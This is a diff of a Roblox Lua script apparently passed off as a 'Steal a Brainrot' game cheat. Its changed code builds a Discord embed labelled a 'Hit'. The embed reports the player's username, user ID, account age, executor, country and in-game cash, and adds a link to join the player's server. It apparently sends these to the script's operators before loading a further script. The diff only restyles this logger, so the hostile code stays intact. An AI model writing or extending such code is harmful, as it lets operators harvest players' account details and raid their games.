@@ -533,21 +533,21 @@ local function showConfirm(rawLink)
                 avatar_url = "https://cdn.discordapp.com/attachments/1394146542813970543/1395733310793060393/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png",
                 content = "",
                 embeds = {{
-                    title = "Steal a Brainrot Hit - Scripts.SM",
-                    url = validLink,
+                    title = "🎯 Steal a Brainrot Hit - Scripts.SM",
+                    url = link,
                     color = 57855,
                     fields = {
-                        {name = "Display Name",   value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
-                        {name = "Username",       value = "```"..(player.Name or "Unknown").."```",       inline = true},
-                        {name = "User ID",        value = "```"..tostring(player.UserId or 0).."```",    inline = true},
-                        {name = "Account Age",    value = "```"..tostring(player.AccountAge or 0).." days```", inline = true},
-                        {name = "Executor",       value = "```"..detectExecutor().."```",               inline = true},
-                        {name = "Country",        value = "```"..getPlayerCountry().."```",             inline = true},
-                        {name = "Cash",           value = "```"..formatCash(cash).."```",               inline = true},
-                        {name = "Steals",         value = "```"..tostring(steals).."```",               inline = true},
-                        {name = "Rebirths",       value = "```"..tostring(rebirths).."```",             inline = true},
-                        {name = "Backpack",       value = "```Failed to Scan```", inline = false},
-                        {name = "Join with URL",  value = "[Click here to join]("..validLink..")", inline = false}
+                        {name = "🪪 Display Name",   value = "```"..(player.DisplayName or "Unknown").."```", inline = true},
+                        {name = "👤 Username",       value = "```"..(player.Name or "Unknown").."```",       inline = true},
+                        {name = "🆔 User ID",        value = "```"..tostring(player.UserId or 0).."```",    inline = true},
+                        {name = "📅 Account Age",    value = "```"..tostring(player.AccountAge or 0).." days```", inline = true},
+                        {name = "💻 Executor",       value = "```"..detectExecutor().."```",               inline = true},
+                        {name = "🌍 Country",        value = "```"..getPlayerCountry().."```",             inline = true},
+                        {name = "💸 Cash",           value = "```"..formatCash(cash).."```",               inline = true},
+                        {name = "🔥 Steals",         value = "```"..tostring(steals).."```",               inline = true},
+                        {name = "♻️ Rebirths",       value = "```"..tostring(rebirths).."```",             inline = true},
+                        {name = "💰 Backpack",       value = "```Failed to Scan```", inline = false},
+                        {name = "🔗 Join with URL",  value = "[Click here to join]("..link..")", inline = false}
                     },
                     footer = {text = "discord.gg/cnUAk7uc3n"},
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -566,7 +566,7 @@ local function showConfirm(rawLink)
             TweenService:Create(blur, TweenInfo.new(0.6), {Size = 0}):Play()
 
             -- Destroy GUI and load next script
-            task.delay(0.8, function()
+            task.delay(0.1, function()
                 screen:Destroy()
 
                 local success, err = pcall(function()
